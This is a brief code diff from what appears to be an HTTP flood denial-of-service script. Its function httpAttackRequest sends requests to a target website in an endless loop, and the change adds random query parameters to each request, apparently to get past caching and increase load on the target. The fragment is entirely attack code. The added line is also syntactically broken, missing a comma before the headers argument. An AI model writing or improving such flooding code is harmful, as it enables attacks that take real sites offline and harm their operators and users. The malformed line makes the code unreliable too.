@@ -13,4 +13,4 @@ def httpAttackRequest(website, userAgent, referer):
 	}
 	
 	while True:
-		requests.get(website, headers=headers)
+		requests.get(website, params={random.randint(1000, 9999): random.randint(1000, 9999)} headers=headers)
